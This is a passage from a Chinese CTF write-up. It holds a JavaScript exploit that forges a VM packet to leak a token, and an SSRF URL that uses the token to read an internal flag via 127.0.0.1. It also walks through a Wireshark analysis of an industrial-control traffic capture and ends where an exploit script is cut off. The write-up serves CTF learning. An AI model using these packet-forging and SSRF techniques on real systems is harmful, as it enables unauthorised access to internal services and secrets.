<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">(<span class="title function_">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;%c[*] 正在构造 Exploit Payload...&quot;</span>, <span class="string">&quot;color: blue; font-weight: bold;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ==========================================</span></span><br><span class="line">    <span class="comment">// 1. 还原编译器核心逻辑 (无需修改)</span></span><br><span class="line">    <span class="comment">// ==========================================</span></span><br><span class="line">    <span class="keyword">const</span> encoder = <span class="keyword">new</span> <span class="title class_">TextEncoder</span>();</span><br><span class="line">    <span class="keyword">const</span> K = [<span class="number">0x1c</span>, <span class="number">0x2d</span>, <span class="number">0x3e</span>, <span class="number">0x40</span>, <span class="number">0xa5</span>, <span class="number">0xb6</span>, <span class="number">0xc7</span>, <span class="number">0xd8</span>, <span class="number">0x24</span>, <span class="number">0x68</span>, <span class="number">0xac</span>, <span class="number">0xe0</span>];</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">K1</span> = ((K[<span class="number">0</span>] &lt;&lt; <span class="number">24</span>) | (K[<span class="number">1</span>] &lt;&lt; <span class="number">16</span>) | (K[<span class="number">2</span>] &lt;&lt; <span class="number">8</span>) | K[<span class="number">3</span>]) &gt;&gt;&gt; <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">K2</span> = ((K[<span class="number">4</span>] &lt;&lt; <span class="number">24</span>) | (K[<span class="number">5</span>] &lt;&lt; <span class="number">16</span>) | (K[<span class="number">6</span>] &lt;&lt; <span class="number">8</span>) | K[<span class="number">7</span>]) &gt;&gt;&gt; <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">K3</span> = ((K[<span class="number">8</span>] &lt;&lt; <span class="number">24</span>) | (K[<span class="number">9</span>] &lt;&lt; <span class="number">16</span>) | (K[<span class="number">10</span>] &lt;&lt; <span class="number">8</span>) | K[<span class="number">11</span>]) &gt;&gt;&gt; <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">ROT</span> = <span class="number">11</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">rotl32</span>(<span class="params">value, shift</span>) &#123; <span class="keyword">return</span> ((value &lt;&lt; shift) | (value &gt;&gt;&gt; (<span class="number">32</span> - shift))) &gt;&gt;&gt; <span class="number">0</span>; &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">encodeOp</span>(<span class="params">opId, nonceLow32</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> rot = (<span class="title function_">rotl32</span>((nonceLow32 ^ <span class="variable constant_">K2</span>) &gt;&gt;&gt; <span class="number">0</span>, <span class="variable constant_">ROT</span>) &amp; <span class="number">0xfffffffc</span>) &gt;&gt;&gt; <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">const</span> base = ((opId ^ <span class="variable constant_">K1</span>) + rot) &gt;&gt;&gt; <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> ((base ^ <span class="variable constant_">K3</span>) | <span class="number">0x80000000</span>) &gt;&gt;&gt; <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">fnv1a32</span>(<span class="params">bytes</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> hash = <span class="number">0x811c9dc5</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; bytes.<span class="property">length</span>; i += <span class="number">1</span>) &#123; hash ^= bytes[i]; hash = (hash * <span class="number">0x01000193</span>) &gt;&gt;&gt; <span class="number">0</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> hash &gt;&gt;&gt; <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">u32le</span>(<span class="params">value</span>) &#123; <span class="keyword">return</span> [value &amp; <span class="number">0xff</span>, (value &gt;&gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>, (value &gt;&gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>, (value &gt;&gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span>]; &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">u16le</span>(<span class="params">value</span>) &#123; <span class="keyword">return</span> [value &amp; <span class="number">0xff</span>, (value &gt;&gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>]; &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">toBase64</span>(<span class="params">bytes</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> binary = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; bytes.<span class="property">length</span>; i += <span class="number">1</span>) &#123; binary += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(bytes[i]); &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">btoa</span>(binary);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ==========================================</span></span><br><span class="line">    <span class="comment">// 2. 构造恶意数据包 (核心漏洞利用点)</span></span><br><span class="line">    <span class="comment">// ==========================================</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 这里的 payload 内容不重要，因为 Slot 3 会忽略参数直接返回 Token</span></span><br><span class="line">    <span class="comment">// 但为了符合协议格式，我们随便填一个</span></span><br><span class="line">    <span class="keyword">const</span> ast = [&#123; <span class="attr">op</span>: <span class="string">&#x27;ECHO&#x27;</span>, <span class="attr">arg</span>: <span class="string">&quot;GIVE_ME_TOKEN&quot;</span> &#125;];</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 生成随机 Nonce</span></span><br><span class="line">    <span class="keyword">const</span> nonce = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>(<span class="number">8</span>);</span><br><span class="line">    crypto.<span class="title function_">getRandomValues</span>(nonce);</span><br><span class="line">    <span class="keyword">const</span> nonceLow32 = <span class="keyword">new</span> <span class="title class_">DataView</span>(nonce.<span class="property">buffer</span>).<span class="title function_">getUint32</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// [!!! 关键点 !!!] </span></span><br><span class="line">    <span class="comment">// 将 flags 设置为 255 (0xFF)。</span></span><br><span class="line">    <span class="comment">// 在 JS 中: (255 &lt;&lt; 24) &gt;&gt; 24 结果为 -1</span></span><br><span class="line">    <span class="comment">// 这将触发隐藏的 Slot 3 指令执行</span></span><br><span class="line">    <span class="keyword">const</span> flags = <span class="number">255</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> chunks = [];</span><br><span class="line">    chunks.<span class="title function_">push</span>(...encoder.<span class="title function_">encode</span>(<span class="string">&#x27;WVLT&#x27;</span>)); <span class="comment">// Header</span></span><br><span class="line">    chunks.<span class="title function_">push</span>(<span class="number">0x01</span>); <span class="comment">// Version</span></span><br><span class="line">    chunks.<span class="title function_">push</span>(...nonce); <span class="comment">// Nonce</span></span><br><span class="line">    chunks.<span class="title function_">push</span>(ast.<span class="property">length</span> &amp; <span class="number">0xff</span>); <span class="comment">// Count</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> opMap = &#123; <span class="attr">ECHO</span>: <span class="number">0</span>, <span class="attr">LEN</span>: <span class="number">1</span>, <span class="attr">HASH</span>: <span class="number">2</span> &#125;;</span><br><span class="line"></span><br><span class="line">    ast.<span class="title function_">forEach</span>(<span class="function">(<span class="params">node</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> opId = opMap[node.<span class="property">op</span>];</span><br><span class="line">        <span class="keyword">const</span> argBytes = encoder.<span class="title function_">encode</span>(node.<span class="property">arg</span>);</span><br><span class="line">        <span class="keyword">const</span> opCode = <span class="title function_">encodeOp</span>(opId, nonceLow32);</span><br><span class="line">        </span><br><span class="line">        chunks.<span class="title function_">push</span>(...<span class="title function_">u32le</span>(opCode));</span><br><span class="line">        chunks.<span class="title function_">push</span>(flags); <span class="comment">// &lt;--- 注入恶意 flags</span></span><br><span class="line">        chunks.<span class="title function_">push</span>(...<span class="title function_">u16le</span>(argBytes.<span class="property">length</span>));</span><br><span class="line">        chunks.<span class="title function_">push</span>(...argBytes);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 计算校验和</span></span><br><span class="line">    <span class="keyword">const</span> body = <span class="title class_">Uint8Array</span>.<span class="title function_">from</span>(chunks);</span><br><span class="line">    <span class="keyword">const</span> checksum = <span class="title function_">fnv1a32</span>(body);</span><br><span class="line">    <span class="keyword">const</span> packet = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>(body.<span class="property">length</span> + <span class="number">4</span>);</span><br><span class="line">    packet.<span class="title function_">set</span>(body, <span class="number">0</span>);</span><br><span class="line">    packet.<span class="title function_">set</span>(<span class="title function_">u32le</span>(checksum), body.<span class="property">length</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> packetB64 = <span class="title function_">toBase64</span>(packet);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] Payload (Base64):&quot;</span>, packetB64);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ==========================================</span></span><br><span class="line">    <span class="comment">// 3. 发送请求</span></span><br><span class="line">    <span class="comment">// ==========================================</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;/api/vm&#x27;</span>, &#123;</span><br><span class="line">            <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">            <span class="attr">headers</span>: &#123; <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span> &#125;,</span><br><span class="line">            <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">packet_b64</span>: packetB64 &#125;)</span><br><span class="line">        &#125;);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">const</span> data = <span class="keyword">await</span> response.<span class="title function_">json</span>();</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;---------------------------------------------------&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (data.<span class="property">ok</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;%c[+] 攻击成功！Token 如下：&quot;</span>, <span class="string">&quot;color: green; font-weight: bold; font-size: 16px;&quot;</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(data.<span class="property">output_utf8</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;%c[-] 失败:&quot;</span>, <span class="string">&quot;color: red&quot;</span>, data.<span class="property">error</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;---------------------------------------------------&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;请求发送失败:&quot;</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=YzlmYzIyMTEwNjFkMjFhMTFhMTc5ZjJlMWZhNDViOGZfQVFLNWl4U0Vab09tWDdTYkdXNVJ5ZEhNTEpLQ3NLQzVfVG9rZW46WjBHbGIzaDV5b3VrVEZ4ZHpvR2M0cFNMbkNlXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<p>拿到token:you-got-me-baby-where-is-my-bytecode</p>
<p>有提示</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=YzQ5ZmI2NzcwNTIxYzYyYmIyNmYzN2RkNDFiYWRkNjVfSTdXQVlQeVhYOXN6T0pjT1hSdWFMMDFXc2J6T01NY3hfVG9rZW46WVZuSGJMOWg3b2JkMjZ4YXFIaGNnemtXbmRnXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<p>&#x2F;robots.txt</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=NDI2NWY1NTgxNzc0ZTc4MmUyNmYwNzg3NGZkNDIzZWRfbHlhbFZaMnNQdVl4aWNWaExDWXJUeTA2M041TkYwOEhfVG9rZW46VVc5Q2JPSnJWb3JhR2J4NUVIdWNvb2NXbnFkXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<p>所以直接访问 <a target="_blank" rel="noopener" href="http://80-a4e7e95b-f6a4-4e87-b38b-1767b80198de.challenge.ctfplus.cn/api/fetch?url=http://127.0.0.1/internal/flag&token=you-got-me-baby-where-is-my-bytecode%E5%8D%B3%E5%8F%AF">http://80-a4e7e95b-f6a4-4e87-b38b-1767b80198de.challenge.ctfplus.cn/api/fetch?url=http://127.0.0.1/internal/flag&amp;token=you-got-me-baby-where-is-my-bytecode即可</a></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=MDdjMWIyYjQ5NjVhMmE0YWJhNTg3NGJhYjY0OTMzZWVfM1ZqYTBYYWdLZlpkMUoyVGRtcTBxYmswa0FlTTlJemlfVG9rZW46VVljMmJqdTVJb21Odm54ZGpwbGNxeUZmbmRiXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="工厂应急流量分析"><a href="#工厂应急流量分析" class="headerlink" title="工厂应急流量分析"></a>工厂应急流量分析</h3><p>这一题容器题有七个小题所以一个个来</p>
<p>（1）要我们找到 Modbus 打开阀门指令的相关信息</p>
<p>我们先筛选出modbus流量，要求是找打开阀门的流量，所以先筛选功能码为5的，且data要为ff00才视为打开</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=NjQ1MTU1MjRhODQ2OWM3MTE2ZTJhOWZhMWU4MDA0ZjVfYjR1VEZsNTkxN09IaWlEUWJzRU04OXVqUjlkdHRNaXJfVG9rZW46T05ZWmJsRnAxb3pHMTF4MWNxbGN4eDZMbkNjXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<p>可以看到筛选出的第一条就满足了条件，按照格式得到flag{0x3c4d_0x05_0x0015}，因为Modbus 协议是基于字节流的，所以功能码占用一个字节，但1 个字节在十六进制下固定用 2 位表示，地址也是同样的道理</p>
<p>（2）找到通过 OPC UA 协议读取的 NodeId</p>
<p>因为我们没办法直接过滤出opcua的流量，所以考虑用脚本一次性提取所有nodeld，</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=ZWE5NTdiMDdlOTY0N2EwNDQwNzIzOTg4ODIxNGEzYjFfdjlFTE5VRzlwRlNPUGg5TmFMaVdhZ1pNWjJ4VDdGeGZfVG9rZW46UzM3TGJEdzlJb3Vxc2p4OHFyVmNzTnF6bjJnXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<p>可以看出，第一个出现的opcua请求对应的就是2 | Valve&#x2F;Status ，所以得到flag{ns&#x3D;2;s&#x3D;Valve&#x2F;Status}</p>
<p>（3）找出控制站域名 ctrlws.factory.local 的解析 IP</p>
<p>可以直接用http.host &#x3D;&#x3D; “ctrlws.factory.local”过滤</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=ODhmMGYwZTI0ZTQwMjUzZWUxN2QxYzEyZDlmNTMwMDJfcGM0Z29BMlpXbGd2Nm5zQVRxZnRqYXVtc05KVVdLQzRfVG9rZW46WDBNSGI2eFhXb081a3Z4aEV1emNZYmdmbnVjXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<p>可以看到Destination项为192.168.1.10，所以得到flag{192.168.1.10}</p>
<p>（4）确定SCADA（源：192.168.1.5）到控制站（目的：192.168.1.10）上首个成功发起的时间点(UTC)</p>
<p>根据上题，39号数据包就是SCADA 客户端首次成功向控制站发送请求的包，直接在下面的详细信息里面能看到时间戳</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDYzZTdmYWYwYjJjYzQ3MDJjNTRjZThiYWI3MjAzZmRfeU1PM1kzN3hwS01ReUl4WjVkNk4wZnFOcUVUN2tGUklfVG9rZW46UTZMTGJaS0dRb0pkOEp4TEMxa2NmZnc3bjJsXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<p>flag{2025-03-15T09:30:01Z}</p>
<p>（5）提取 SCADA 对控制站发起的 HTTP 请求的 Host 与 URI</p>
<p>同样还是包39，Host: ctrlws.factory.local URI: &#x2F;api&#x2F;status </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=NGVhNzZjYzIzYjU3YWFlZmFmZjUyOTQyMDYwMjRhMWZfajFGdGRFdzJXN0dsWENWbmx6bmJYRHFoQ3ZobGVTUFJfVG9rZW46RGhpRGJhclF2b2dOSm54Y1dEOGNnUTN2bkpoXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<p>根据格式，flag{ctrlws.factory.local_&#x2F;api&#x2F;status}</p>
<p>（6）攻击者（192.168.1.100）对控制站发起了 ICMP Echo Request（ping）。找出该 ICMP 请求的序列号（Sequence Number）</p>
<p>还是先使用过滤语句icmp &amp;&amp; ip.src &#x3D;&#x3D; 192.168.1.100定位</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=ZmJhMjYxNGM4MWEzMzhjMDI3YTViMjViNGQ3NTViZWNfaXVCNlNqdHphaWIzdXdzaTVNdkJpNGc0Y3pQMUNXWVBfVG9rZW46VGtucmJQQ0FZb1BQYTF4WXlZY2NiUjJQbldmXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<p>根据题目，第一条流量就包含了Echo Request（ping）的信息所以首先考虑第一条流量，flag{0x0123}</p>
<p>（7）SCADA 对控制站发起了 SNMP Get 请求。找出该请求查询的 OID（Object Identifier）</p>
<p>从前面的题目我们已知SCADA 和控制站的ip分别是192.168.1.5和192.168.1.10，先过滤定位snmp &amp;&amp; ip.src &#x3D;&#x3D; 192.168.1.5，但是发现wire识别不到snmp流量，尝试别的方法，ip.src &#x3D;&#x3D; 192.168.1.5 &amp;&amp; ip.dst &#x3D;&#x3D; 192.168.1.10 &amp;&amp; frame contains “GetRequest”，强制ws扫描包的原始负载，</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=YTY5ZjkwZGEwYzExNWFjYmUxNTUyM2Q2MmJjZTUyNTBfZGNhajJQcDRmcHZpUzVnOG1uUjNVNXRyNnFPeExGNVNfVG9rZW46VmUwdmJrbnlYbzFSV214eXg0VGM4cDJYbnBoXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<p>扫描完成发现只有一条流量符合，能看到这个包内的字符串OID&#x3D;1.3.6.1.2.1.1.5.0，所以flag{1.3.6.1.2.1.1.5.0}</p>
<p>提交所有题目的flag后拿到目标flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=MjlkNDZjNzczYmYyN2FhY2JhMjc4YTBiMWI0NTM2NmJfWFBNZU9QZ3ZQa1hnVWJzRjFxREtUb2JVeUY2VDl0QTRfVG9rZW46T0hPRGJDQ3pGb3M1RHV4ZnlPaWNuZXlNblNnXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<h3 id="Cube-God"><a href="#Cube-God" class="headerlink" title="Cube God"></a>Cube God</h3><p>只能  ai-all in了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTlhMWUzNGM1NWIwOWVhOTk3MGI4NmE3OGM3MjMxZmNfSnM5cWNoYk5zNmxUcjVuQ2oxOVhReUZZVTJCc1RyTThfVG9rZW46UllsYWJjUzRsb3k5OHB4UFhteGNXT2ttbmljXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<p>Exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span 